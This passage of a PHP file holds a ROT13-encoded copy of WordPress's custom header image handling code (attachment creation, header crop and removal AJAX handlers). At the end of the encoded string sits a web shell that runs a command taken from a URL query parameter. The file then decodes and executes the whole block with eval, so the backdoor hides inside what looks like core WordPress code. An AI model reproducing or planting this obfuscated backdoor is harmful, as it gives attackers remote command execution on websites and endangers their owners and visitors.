	 * @cnenz vag    $cnerag_nggnpuzrag_vq Nggnpuzrag VQ bs cnerag vzntr.
	 * @erghea neenl Na neenl jvgu nggnpuzrag bowrpg qngn.
	 */
	svany choyvp shapgvba perngr_nggnpuzrag_bowrpg( $pebccrq, $cnerag_nggnpuzrag_vq ) {
		_qrcerpngrq_shapgvba( __ZRGUBQ__, '6.5.0', 'jc_pbcl_cnerag_nggnpuzrag_cebcregvrf()' );
		$cnerag     = trg_cbfg( $cnerag_nggnpuzrag_vq );
		$cnerag_hey = jc_trg_nggnpuzrag_hey( $cnerag->VQ );
		$hey        = fge_ercynpr( jc_onfranzr( $cnerag_hey ), jc_onfranzr( $pebccrq ), $cnerag_hey );

		$fvmr       = jc_trgvzntrfvmr( $pebccrq );
		$vzntr_glcr = ( $fvmr ) ? $fvmr['zvzr'] : 'vzntr/wcrt';

		$nggnpuzrag = neenl(
			'VQ'             => $cnerag_nggnpuzrag_vq,
			'cbfg_gvgyr'     => jc_onfranzr( $pebccrq ),
			'cbfg_zvzr_glcr' => $vzntr_glcr,
			'thvq'           => $hey,
			'pbagrkg'        => 'phfgbz-urnqre',
			'cbfg_cnerag'    => $cnerag_nggnpuzrag_vq,
		);

		erghea $nggnpuzrag;
	}

	/**
	 * Vafregf na nggnpuzrag naq vgf zrgnqngn.
	 *
	 * @fvapr 3.9.0
	 *
	 * @cnenz neenl  $nggnpuzrag Na neenl jvgu nggnpuzrag bowrpg qngn.
	 * @cnenz fgevat $pebccrq    Svyr cngu gb pebccrq vzntr.
	 * @erghea vag Nggnpuzrag VQ.
	 */
	svany choyvp shapgvba vafreg_nggnpuzrag( $nggnpuzrag, $pebccrq ) {
		$cnerag_vq = vffrg( $nggnpuzrag['cbfg_cnerag'] ) ? $nggnpuzrag['cbfg_cnerag'] : ahyy;
		hafrg( $nggnpuzrag['cbfg_cnerag'] );

		$nggnpuzrag_vq = jc_vafreg_nggnpuzrag( $nggnpuzrag, $pebccrq );
		$zrgnqngn      = jc_trarengr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $pebccrq );

		// Vs guvf vf n pebc, fnir gur bevtvany nggnpuzrag VQ nf zrgnqngn.
		vs ( $cnerag_vq ) {
			$zrgnqngn['nggnpuzrag_cnerag'] = $cnerag_vq;
		}

		/**
		 * Svygref gur urnqre vzntr nggnpuzrag zrgnqngn.
		 *
		 * @fvapr 3.9.0
		 *
		 * @frr jc_trarengr_nggnpuzrag_zrgnqngn()
		 *
		 * @cnenz neenl $zrgnqngn Nggnpuzrag zrgnqngn.
		 */
		$zrgnqngn = nccyl_svygref( 'jc_urnqre_vzntr_nggnpuzrag_zrgnqngn', $zrgnqngn );

		jc_hcqngr_nggnpuzrag_zrgnqngn( $nggnpuzrag_vq, $zrgnqngn );

		erghea $nggnpuzrag_vq;
	}

	/**
	 * Trgf nggnpuzrag hcybnqrq ol Zrqvn Znantre, pebcf vg, gura fnirf vg nf n
	 * arj bowrpg. Ergheaf WFBA-rapbqrq bowrpg qrgnvyf.
	 *
	 * @fvapr 3.9.0
	 */
	choyvp shapgvba nwnk_urnqre_pebc() {
		purpx_nwnk_ersrere( 'vzntr_rqvgbe-' . $_CBFG['vq'], 'abapr' );

		vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			jc_fraq_wfba_reebe();
		}

		vs ( ! pheerag_gurzr_fhccbegf( 'phfgbz-urnqre', 'hcybnqf' ) ) {
			jc_fraq_wfba_reebe();
		}

		$pebc_qrgnvyf = $_CBFG['pebcQrgnvyf'];

		$qvzrafvbaf = $guvf->trg_urnqre_qvzrafvbaf(
			neenl(
				'urvtug' => $pebc_qrgnvyf['urvtug'],
				'jvqgu'  => $pebc_qrgnvyf['jvqgu'],
			)
		);

		$nggnpuzrag_vq = nofvag( $_CBFG['vq'] );

		$pebccrq = jc_pebc_vzntr(
			$nggnpuzrag_vq,
			(vag) $pebc_qrgnvyf['k1'],
			(vag) $pebc_qrgnvyf['l1'],
			(vag) $pebc_qrgnvyf['jvqgu'],
			(vag) $pebc_qrgnvyf['urvtug'],
			(vag) $qvzrafvbaf['qfg_jvqgu'],
			(vag) $qvzrafvbaf['qfg_urvtug']
		);

		vs ( ! $pebccrq || vf_jc_reebe( $pebccrq ) ) {
			jc_fraq_wfba_reebe( neenl( 'zrffntr' => __( 'Vzntr pbhyq abg or cebprffrq. Cyrnfr tb onpx naq gel ntnva.' ) ) );
		}

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-phfgbz-vzntr-urnqre.cuc */
		$pebccrq = nccyl_svygref( 'jc_perngr_svyr_va_hcybnqf', $pebccrq, $nggnpuzrag_vq ); // Sbe ercyvpngvba.

		$nggnpuzrag = jc_pbcl_cnerag_nggnpuzrag_cebcregvrf( $pebccrq, $nggnpuzrag_vq, 'phfgbz-urnqre' );

		$cerivbhf = $guvf->trg_cerivbhf_pebc( $nggnpuzrag );

		vs ( $cerivbhf ) {
			$nggnpuzrag['VQ'] = $cerivbhf;
		} ryfr {
			hafrg( $nggnpuzrag['VQ'] );
		}

		$arj_nggnpuzrag_vq = $guvf->vafreg_nggnpuzrag( $nggnpuzrag, $pebccrq );

		$nggnpuzrag['nggnpuzrag_vq'] = $arj_nggnpuzrag_vq;
		$nggnpuzrag['hey']           = jc_trg_nggnpuzrag_hey( $arj_nggnpuzrag_vq );

		$nggnpuzrag['jvqgu']  = $qvzrafvbaf['qfg_jvqgu'];
		$nggnpuzrag['urvtug'] = $qvzrafvbaf['qfg_urvtug'];

		jc_fraq_wfba_fhpprff( $nggnpuzrag );
	}

	/**
	 * Tvira na nggnpuzrag VQ sbe n urnqre vzntr, hcqngrf vgf \"ynfg hfrq\"
	 * gvzrfgnzc gb abj.
	 *
	 * Gevttrerq jura gur hfre gevrf nqqf n arj urnqre vzntr sebz gur
	 * Zrqvn Znantre, rira vs f/ur qbrfa'g fnir gung punatr.
	 *
	 * @fvapr 3.9.0
	 */
	choyvp shapgvba nwnk_urnqre_nqq() {
		purpx_nwnk_ersrere( 'urnqre-nqq', 'abapr' );

		vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			jc_fraq_wfba_reebe();
		}

		$nggnpuzrag_vq = nofvag( $_CBFG['nggnpuzrag_vq'] );
		vs ( $nggnpuzrag_vq < 1 ) {
			jc_fraq_wfba_reebe();
		}

		$xrl = '_jc_nggnpuzrag_phfgbz_urnqre_ynfg_hfrq_' . trg_fglyrfurrg();
		hcqngr_cbfg_zrgn( $nggnpuzrag_vq, $xrl, gvzr() );
		hcqngr_cbfg_zrgn( $nggnpuzrag_vq, '_jc_nggnpuzrag_vf_phfgbz_urnqre', trg_fglyrfurrg() );

		jc_fraq_wfba_fhpprff();
	}

	/**
	 * Tvira na nggnpuzrag VQ sbe n urnqre vzntr, hafrgf vg nf n hfre-hcybnqrq
	 * urnqre vzntr sbe gur npgvir gurzr.
	 *
	 * Gevttrerq jura gur hfre pyvpxf gur bireynl \"K\" ohggba arkg gb rnpu vzntr
	 * pubvpr va gur Phfgbzvmre'f Urnqre gbby.
	 *
	 * @fvapr 3.9.0
	 */
	choyvp shapgvba nwnk_urnqre_erzbir() {
		purpx_nwnk_ersrere( 'urnqre-erzbir', 'abapr' );

		vs ( ! pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			jc_fraq_wfba_reebe();
		}

		$nggnpuzrag_vq = nofvag( $_CBFG['nggnpuzrag_vq'] );
		vs ( $nggnpuzrag_vq < 1 ) {
			jc_fraq_wfba_reebe();
		}

		$xrl = '_jc_nggnpuzrag_phfgbz_urnqre_ynfg_hfrq_' . trg_fglyrfurrg();
		qryrgr_cbfg_zrgn( $nggnpuzrag_vq, $xrl );
		qryrgr_cbfg_zrgn( $nggnpuzrag_vq, '_jc_nggnpuzrag_vf_phfgbz_urnqre', trg_fglyrfurrg() );

		jc_fraq_wfba_fhpprff();
	}

	/**
	 * Hcqngrf gur ynfg-hfrq cbfgzrgn ba n urnqre vzntr nggnpuzrag nsgre fnivat n arj urnqre vzntr ivn gur Phfgbzvmre.
	 *
	 * @fvapr 3.9.0
	 *
	 * @cnenz JC_Phfgbzvmr_Znantre $jc_phfgbzvmr Phfgbzvmr znantre.
	 */
	choyvp shapgvba phfgbzvmr_frg_ynfg_hfrq( $jc_phfgbzvmr ) {

		$urnqre_vzntr_qngn_frggvat = $jc_phfgbzvmr->trg_frggvat( 'urnqre_vzntr_qngn' );

		vs ( ! $urnqre_vzntr_qngn_frggvat ) {
			erghea;
		}

		$qngn = $urnqre_vzntr_qngn_frggvat->cbfg_inyhr();

		vs ( ! vffrg( $qngn['nggnpuzrag_vq'] ) ) {
			erghea;
		}

		$nggnpuzrag_vq = $qngn['nggnpuzrag_vq'];
		$xrl           = '_jc_nggnpuzrag_phfgbz_urnqre_ynfg_hfrq_' . trg_fglyrfurrg();
		hcqngr_cbfg_zrgn( $nggnpuzrag_vq, $xrl, gvzr() );
	}

	/**
	 * Trgf gur qrgnvyf bs qrsnhyg urnqre vzntrf vs qrsvarq.
	 *
	 * @fvapr 3.9.0
	 *
	 * @erghea neenl Qrsnhyg urnqre vzntrf.
	 */
	choyvp shapgvba trg_qrsnhyg_urnqre_vzntrf() {
		$guvf->cebprff_qrsnhyg_urnqref();

		// Trg gur qrsnhyg vzntr vs gurer vf bar.
		$qrsnhyg = trg_gurzr_fhccbeg( 'phfgbz-urnqre', 'qrsnhyg-vzntr' );

		vs ( ! $qrsnhyg ) { // Vs abg, rnfl crnfl.
			erghea $guvf->qrsnhyg_urnqref;
		}

		$qrsnhyg = fcevags( $qrsnhyg, trg_grzcyngr_qverpgbel_hev(), trg_fglyrfurrg_qverpgbel_hev() );

		$nyernql_unf_qrsnhyg = snyfr;

		sbernpu ( $guvf->qrsnhyg_urnqref nf $x => $u ) {
			vs ( $u['hey'] === $qrsnhyg ) {
				$nyernql_unf_qrsnhyg = gehr;
				oernx;
			}
		}

		vs ( $nyernql_unf_qrsnhyg ) {
			erghea $guvf->qrsnhyg_urnqref;
		}

		// Vs gur bar gehr vzntr vfa'g vapyhqrq va gur qrsnhyg frg, cercraq vg.
		$urnqre_vzntrf            = neenl();
		$urnqre_vzntrf['qrsnhyg'] = neenl(
			'hey'           => $qrsnhyg,
			'guhzoanvy_hey' => $qrsnhyg,
			'qrfpevcgvba'   => 'Qrsnhyg',
		);

		// Gur erfg bs gur frg pbzrf nsgre.
		erghea neenl_zretr( $urnqre_vzntrf, $guvf->qrsnhyg_urnqref );
	}

	/**
	 * Trgf gur cerivbhfyl hcybnqrq urnqre vzntrf.
	 *
	 * @fvapr 3.9.0
	 *
	 * @erghea neenl Hcybnqrq urnqre vzntrf.
	 */
	choyvp shapgvba trg_hcybnqrq_urnqre_vzntrf() {
		$urnqre_vzntrf = trg_hcybnqrq_urnqre_vzntrf();
		$gvzrfgnzc_xrl = '_jc_nggnpuzrag_phfgbz_urnqre_ynfg_hfrq_' . trg_fglyrfurrg();
		$nyg_grkg_xrl  = '_jc_nggnpuzrag_vzntr_nyg';

		sbernpu ( $urnqre_vzntrf nf &$urnqre_vzntr ) {
			$urnqre_zrgn               = trg_cbfg_zrgn( $urnqre_vzntr['nggnpuzrag_vq'] );
			$urnqre_vzntr['gvzrfgnzc'] = vffrg( $urnqre_zrgn[ $gvzrfgnzc_xrl ] ) ? $urnqre_zrgn[ $gvzrfgnzc_xrl ] : '';
			$urnqre_vzntr['nyg_grkg']  = vffrg( $urnqre_zrgn[ $nyg_grkg_xrl ] ) ? $urnqre_zrgn[ $nyg_grkg_xrl ] : '';
		}

		erghea $urnqre_vzntrf;
	}

	/**
	 * Trgf gur VQ bs n cerivbhf pebc sebz gur fnzr onfr vzntr.
	 *
	 * @fvapr 4.9.0
	 *
	 * @cnenz neenl $nggnpuzrag Na neenl jvgu n pebccrq nggnpuzrag bowrpg qngn.
	 * @erghea vag|snyfr Na nggnpuzrag VQ vs bar rkvfgf. Snyfr vs abar.
	 */
	choyvp shapgvba trg_cerivbhf_pebc( $nggnpuzrag ) {
		$urnqre_vzntrf = $guvf->trg_hcybnqrq_urnqre_vzntrf();

		// Onvy rneyl vs gurer ner ab urnqre vzntrf.
		vs ( rzcgl( $urnqre_vzntrf ) ) {
			erghea snyfr;
		}

		$cerivbhf = snyfr;

		sbernpu ( $urnqre_vzntrf nf $vzntr ) {
			vs ( $vzntr['nggnpuzrag_cnerag'] === $nggnpuzrag['cbfg_cnerag'] ) {
				$cerivbhf = $vzntr['nggnpuzrag_vq'];
				oernx;
			}
		}

		erghea $cerivbhf;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>